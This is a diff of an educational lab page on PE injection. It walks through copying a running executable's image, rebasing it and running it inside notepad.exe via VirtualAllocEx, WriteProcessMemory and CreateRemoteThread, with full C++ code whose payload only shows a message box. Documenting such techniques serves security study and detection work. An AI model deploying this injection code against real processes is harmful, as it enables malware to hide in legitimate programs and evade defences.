@@ -4,26 +4,33 @@ description: Code Injection
 
 # PE Injection: Executing PEs inside Remote Processes
 
-This is a quick lab of a simplified way of injecting an entire portable executabe \(PE\) into another running process. Note that in order to inject more complex PEs, additional DLLs in the target process may need to be loaded and Import Address Table fixed and for this, refer to my other lab [Reflective DLL Injection](reflective-dll-injection.md#resolving-import-address-table).
+This is a quick lab of a simplified way of injecting an entire portable executabe \(PE\) into another running process.
+
+{% hint style="warning" %}
+Note that in order to inject more complex PEs, additional DLLs in the target process may need to be loaded and Import Address Table fixed and for this, refer to my other lab [Reflective DLL Injection](reflective-dll-injection.md#resolving-import-address-table).
+{% endhint %}
 
 ## Overview
 
-In this lab, I wrote a simple C++ executable that consists of two functions:
+In this lab, I wrote a simple C++ executable that self-injects its PE into a target process. This executable contains 2 functions:
 
-* `main` - this is the function that is responsible for injection of the PE image of the running process into a remote/target process
-* `InjectionEntryPoint` - this is the function that will get executed by the target process \(notepad in my case\) once it gets injected. 
+* `main` - this is the function that performs the self-injection of the PE image into a specified remote/target process, which is going to be `notepad.exe` in this case;
+* `InjectionEntryPoint` - this is the function that will get executed by the target process \(notepad\) once notepads gets injected with our PE. 
   * This function will pop a `MessageBox` with a name of the module the code is currently running from. If injection is successful, it should spit out a path of notepad.exe.
 
-High level process of the technique as used in this lab:
+## Technique Overview
 
-1. Parse the currently running image's PE headers and get its `sizeOfImage`
-2. Allocate a block of memory \(size of PE image retrieved in step 1\) in the currently running process. Let's call it `localImage`
-3. Copy the image of the current process into the newly allocated local memory
-4. Allocate new memory block \(size of PE image retrieved in step 1\) in a remote process - the target process we want to inject the currently running PE into. Let's call it `targetImage`
-5. Calculate delta between memory addresses `localImage` and `targetImage`
-6. Patch the PE you're injecting or, in other words, relocate it/rebase it to `targetImage`. For more information about image relocations, see my other lab [T1093: Process Hollowing and Portable Executable Relocations](process-hollowing-and-pe-image-relocations.md)
-7. Write the patched PE into `targetImage` memory location
-8. Create remote thread and point it to `InjectionEntryPoint` function inside the PE
+Inside the current process, that's doing the self-injection of its PE:
+
+1. Get the image base address `imageBase`
+2. Parse the PE headers and get its `sizeOfImage`
+3. Allocate a block of memory \(size of PE image retrieved in step 1\). Let's call it `localImage`
+4. Copy the image of the current process into the newly allocated local memory `localImage`
+5. Allocate a new memory block \(size of PE image retrieved in step 1\) in a remote process - the target process we want to inject the currently running PE into. Let's call it `targetImage`
+6. Calculate the delta between memory addresses `targetImage` and `imageBase`, let's call it `deltaImageBase` 
+7. Relocate/rebase the PE that's stored in `localImage` to `targetImage`. For more information about image relocations, see my other lab [T1093: Process Hollowing and Portable Executable Relocations](process-hollowing-and-pe-image-relocations.md)
+8. Write the patched PE into the `targetImage` memory location using `WriteProcessMemory`
+9. Create remote thread and point it to `InjectionEntryPoint` function inside the PE target process
 
 ## Walkthrough
 
@@ -39,7 +46,9 @@ Let's allocate a new block of memory in the target process. In my case it got al
 
 ![](../../.gitbook/assets/image%20%28214%29.png)
 
-Calculate the delta between 0x000001bfc0c20000 and 0x000001813acc0000 and apply image base relocations. Once that's done, we can move over our rebased PE from 0x000001813acc0000 to 0x000001bfc0c20000 in the remote process using `WriteProcessMemory`. Below shows that our imaged has now been moved to the remote process:
+Calculate the delta between `0x000001bfc0c20000` and `0x000001813acc0000` and perform [image base relocations](process-hollowing-and-pe-image-relocations.md#relocation). Once that's done, we can move over our rebased PE from `0x000001813acc0000` to `0x000001bfc0c20000` in the remote process using `WriteProcessMemory`. 
+
+Below shows that our imaged has now been moved to the remote process:
 
 ![](../../.gitbook/assets/image%20%2891%29.png)
 
@@ -59,15 +68,16 @@ Below shows how we've injected the PE into the notepad \(PID 11068\) and execute
 
 ## Code
 
+Below is the commented code that performs the PE injection:
+
 ```cpp
-#include "pch.h"
 #include <stdio.h>
 #include <Windows.h>
 
 typedef struct BASE_RELOCATION_ENTRY {
 	USHORT Offset : 12;
 	USHORT Type : 4;
-} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
+} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
 
 DWORD InjectionEntryPoint()
 {
@@ -79,23 +89,30 @@ DWORD InjectionEntryPoint()
 
 int main()
 {
+	// Get current image's base address
 	PVOID imageBase = GetModuleHandle(NULL);
 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
 	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);
-	
+
+	// Allocate a new memory block and copy the current PE image to this new memory block
 	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
 	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
+
+	// Open the target process - this is process we will be injecting this PE into
+	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, 9304);
 	
-	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, 11068);
+	// Allote a new memory block in the target process. This is where we will be injecting this PE
 	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
+	// Calculate delta between addresses of where the image will be located in the target process and where it's located currently
 	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
 
+	// Relocate localImage, to ensure that it will have correct addresses once its in the target process
 	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 	DWORD relocationEntriesCount = 0;
 	PDWORD_PTR patchedAddress;
 	PBASE_RELOCATION_ENTRY relocationRVA = NULL;
-	
+
 	while (relocationTable->SizeOfBlock > 0)
 	{
 		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
@@ -112,7 +129,10 @@ int main()
 		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
 	}
 
+	// Write the relocated localImage into the target process
 	WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);
+
+	// Start the injected PE inside the target process
 	CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);
 
 	return 0;
